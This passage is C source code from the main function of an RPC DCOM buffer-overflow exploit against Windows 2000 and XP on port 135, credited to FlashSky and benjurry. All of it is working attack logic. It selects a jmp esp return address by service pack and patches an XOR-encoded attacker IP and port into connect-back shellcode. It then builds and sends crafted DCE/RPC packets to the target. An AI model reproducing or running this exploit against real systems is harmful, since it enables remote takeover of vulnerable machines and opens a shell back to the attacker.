void main(int argc,char ** argv)
{
    WSADATA WSAData;
    SOCKET sock;
    int len,len1;
    SOCKADDR_IN addr_in;
    short port=135;
    unsigned char buf1[0x1000];
    unsigned char buf2[0x1000];
    unsigned short port1;
    DWORD cb;

    printf("RPC DCOM overflow Vulnerability discoveried by LSD\n");
    printf("Code by FlashSky,[email protected],benjurry,[email protected]\n");
    printf("Welcome to our English Site: http://www.xfocus.org\n");
    printf("Welcome to our Chinese Site: http://www.xfocus.net\n");


if(argc<5)
{
  printf("useage:%s targetip localIP LocalPort SPVersion\n",argv[0]);
   printf("SPVersion:\n0 w2k Chinese version +sp3\n 1 w2k Chinese version +SP4\n 2 winxp English version +sp1\n");
exit(1);
}

if(atoi(argv[4])==0)
memcpy(sc+36,jmpesp_cn_sp3,sizeof(jmpesp_cn_sp3));
else if (atoi(argv[4])==1)
memcpy(sc+36,jmpesp_cn_sp4,sizeof(jmpesp_cn_sp4));
else if (atoi(argv[4])==2)
memcpy(sc+36,jmpesp_en_xp_sp1,sizeof(jmpesp_en_xp_sp1));


    if (WSAStartup(MAKEWORD(2,0),&WSAData)!=0)
    {
        printf("WSAStartup error.Error:%d\n",WSAGetLastError());
        return;
    }

    addr_in.sin_family=AF_INET;
    addr_in.sin_port=htons(port);
    addr_in.sin_addr.S_un.S_addr=inet_addr(argv[1]);

    if ((sock=socket(AF_INET,SOCK_STREAM,IPPROTO_TCP))==INVALID_SOCKET)
    {
        printf("Socket failed.Error:%d\n",WSAGetLastError());
        return;
    }
    if(WSAConnect(sock,(struct sockaddr *)&addr_in,sizeof(addr_in),NULL,NULL,NULL,NULL)==SOCKET_ERROR)
    {
        printf("Connect failed.Error:%d",WSAGetLastError());
        return;
    }
    port1 = htons(atoi(argv[3]));
    port1 ^= 0x9393;
    cb=inet_addr(argv[2]);
    cb ^= 0x93939393;
    *(unsigned short *)&sc[330+0x30] = port1;
    *(unsigned int *)&sc[335+0x30] = cb;
    len=sizeof(sc);
    memcpy(buf2,request1,sizeof(request1));
    len1=sizeof(request1);
    *(DWORD *)(request2)=*(DWORD *)(request2)+sizeof(sc)/2;
    *(DWORD *)(request2+8)=*(DWORD *)(request2+8)+sizeof(sc)/2;
    memcpy(buf2+len1,request2,sizeof(request2));
    len1=len1+sizeof(request2);
    memcpy(buf2+len1,sc,sizeof(sc));
    len1=len1+sizeof(sc);
    memcpy(buf2+len1,request3,sizeof(request3));
    len1=len1+sizeof(request3);
    memcpy(buf2+len1,request4,sizeof(request4));
    len1=len1+sizeof(request4);
    *(DWORD *)(buf2+8)=*(DWORD *)(buf2+8)+sizeof(sc)-0xc;

    *(DWORD *)(buf2+0x10)=*(DWORD *)(buf2+0x10)+sizeof(sc)-0xc;
    *(DWORD *)(buf2+0x80)=*(DWORD *)(buf2+0x80)+sizeof(sc)-0xc;
    *(DWORD *)(buf2+0x84)=*(DWORD *)(buf2+0x84)+sizeof(sc)-0xc;
    *(DWORD *)(buf2+0xb4)=*(DWORD *)(buf2+0xb4)+sizeof(sc)-0xc;
    *(DWORD *)(buf2+0xb8)=*(DWORD *)(buf2+0xb8)+sizeof(sc)-0xc;
    *(DWORD *)(buf2+0xd0)=*(DWORD *)(buf2+0xd0)+sizeof(sc)-0xc;
    *(DWORD *)(buf2+0x18c)=*(DWORD *)(buf2+0x18c)+sizeof(sc)-0xc;
    if (send(sock,bindstr,sizeof(bindstr),0)==SOCKET_ERROR)
    {
            printf("Send failed.Error:%d\n",WSAGetLastError());
            return;
    }

    len=recv(sock,buf1,1000,NULL);
    if (send(sock,buf2,len1,0)==SOCKET_ERROR)
    {
            printf("Send failed.Error:%d\n",WSAGetLastError());
            return;
    }
    len=recv(sock,buf1,1024,NULL);
}